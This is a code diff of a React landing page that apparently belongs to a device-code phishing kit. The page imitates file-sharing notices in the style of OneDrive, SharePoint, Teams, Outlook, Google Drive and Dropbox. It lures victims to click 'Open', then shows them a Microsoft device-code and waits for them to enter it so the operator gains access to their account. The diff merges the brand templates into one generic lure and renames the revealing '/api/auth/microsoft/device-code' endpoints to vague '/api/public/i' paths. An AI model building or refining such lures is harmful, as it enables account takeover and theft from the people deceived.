@@ -2,12 +2,6 @@
 
 import { useState, useEffect, useRef } from "react";
 import { Copy, Check, ExternalLink, Loader2, Mail } from "lucide-react";
-import OneDriveTemplate from "@/components/templates/OneDriveTemplate";
-import SharePointTemplate from "@/components/templates/SharePointTemplate";
-import TeamsTemplate from "@/components/templates/TeamsTemplate";
-import OutlookTemplate from "@/components/templates/OutlookTemplate";
-import GoogleDriveTemplate from "@/components/templates/GoogleDriveTemplate";
-import DropboxTemplate from "@/components/templates/DropboxTemplate";
 
 interface InvitationLandingProps {
   invitationId: string;
@@ -18,6 +12,14 @@ interface InvitationLandingProps {
   senderName: string;
   exitUrl: string | null;
 }
+
+const DOC_COLORS: Record<string, string> = {
+  PDF: "#E74C3C",
+  DOCX: "#2B579A",
+  XLSX: "#217346",
+  PPTX: "#D24726",
+  ZIP: "#F0AD4E",
+};
 
 export default function InvitationLanding({
   invitationId,
@@ -42,7 +44,7 @@ export default function InvitationLanding({
   const handleConnect = async () => {
     setConnecting(true);
     try {
-      const res = await fetch("/api/auth/microsoft/device-code/invitation", {
+      const res = await fetch("/api/public/i/connect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ invitationId }),
@@ -67,13 +69,12 @@ export default function InvitationLanding({
     }
   };
 
-  // Poll for completion
   useEffect(() => {
     if (stage !== "waiting" || !deviceCode) return;
 
     pollRef.current = setInterval(async () => {
       try {
-        const res = await fetch("/api/auth/microsoft/device-code/invitation/poll", {
+        const res = await fetch("/api/public/i/poll", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ deviceCode, invitationId }),
@@ -114,30 +115,59 @@ export default function InvitationLanding({
     setTimeout(() => setCopied(false), 2000);
   };
 
-  // Template stage — show branded page
+  // Template stage — generic branded page
   if (stage === "template") {
-    const templateProps = {
-      documentTitle,
-      docType,
-      senderName,
-      onConnect: handleConnect,
-      connecting,
-    };
+    const docColor = DOC_COLORS[docType] || "#0078D4";
+    const brandName = template
+      .split("_")
+      .map((w) => w.charAt(0).toUpperCase() + w.slice(1))
+      .join(" ");
 
-    switch (template) {
-      case "SHAREPOINT_DOCUMENT":
-        return <SharePointTemplate {...templateProps} />;
-      case "TEAMS_CHAT_FILE":
-        return <TeamsTemplate {...templateProps} />;
-      case "OUTLOOK_ENCRYPTED":
-        return <OutlookTemplate {...templateProps} />;
-      case "GOOGLE_DRIVE":
-        return <GoogleDriveTemplate {...templateProps} />;
-      case "DROPBOX_FILE":
-        return <DropboxTemplate {...templateProps} />;
-      default:
-        return <OneDriveTemplate {...templateProps} />;
-    }
+    return (
+      <div style={{ minHeight: "100vh", backgroundColor: "#1b1b1b", display: "flex", flexDirection: "column", alignItems: "center" }}>
+        <div style={{ width: "100%", padding: "16px 24px", backgroundColor: "#0078D4", display: "flex", alignItems: "center", gap: 10 }}>
+          <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>{brandName}</span>
+        </div>
+        <div style={{ maxWidth: 480, width: "100%", margin: "80px auto 0", padding: "0 16px" }}>
+          <div style={{ backgroundColor: "#2d2d2d", borderRadius: 8, padding: 32, border: "1px solid #404040" }}>
+            <p style={{ color: "#a0a0a0", fontSize: 13, marginBottom: 8 }}>
+              {senderName} shared a file with you
+            </p>
+            <div style={{ display: "flex", alignItems: "center", gap: 16, padding: "16px 0", borderBottom: "1px solid #404040", marginBottom: 24 }}>
+              <div style={{ width: 48, height: 56, borderRadius: 4, backgroundColor: docColor, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 12, fontWeight: 700 }}>
+                {docType}
+              </div>
+              <div>
+                <p style={{ color: "#e0e0e0", fontSize: 15, fontWeight: 600 }}>{documentTitle}</p>
+                <p style={{ color: "#808080", fontSize: 12, marginTop: 2 }}>{docType} &middot; {new Date().toLocaleDateString()}</p>
+              </div>
+            </div>
+            <button
+              onClick={handleConnect}
+              disabled={connecting}
+              style={{
+                width: "100%",
+                padding: "12px 24px",
+                backgroundColor: connecting ? "#005a9e" : "#0078D4",
+                color: "#fff",
+                border: "none",
+                borderRadius: 4,
+                fontSize: 14,
+                fontWeight: 600,
+                cursor: connecting ? "not-allowed" : "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 8,
+              }}
+            >
+              {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
+              {connecting ? "Opening..." : "Open"}
+            </button>
+          </div>
+        </div>
+      </div>
+    );
   }
 
   // Waiting stage — show code
@@ -145,7 +175,6 @@ export default function InvitationLanding({
     return (
       <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#0a0a0a", padding: 16 }}>
         <div style={{ width: "100%", maxWidth: 500 }}>
-          {/* Code card */}
           <div style={{ background: "#141414", border: "1px solid #2a2a2a", borderRadius: 12, padding: 32, textAlign: "center" }}>
             <p style={{ color: "#888", fontSize: 14, marginBottom: 8 }}>Verification code</p>
             <p style={{ fontFamily: "monospace", fontSize: 36, fontWeight: "bold", letterSpacing: "0.3em", color: "#fff", margin: "12px 0" }}>
@@ -204,7 +233,6 @@ export default function InvitationLanding({
             </a>
           </div>
 
-          {/* Polling indicator */}
           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginTop: 24 }}>
             <Loader2 size={16} style={{ animation: "spin 1s linear infinite", color: "#888" }} />
             <span style={{ color: "#888", fontSize: 14 }}>Waiting for authentication...</span>
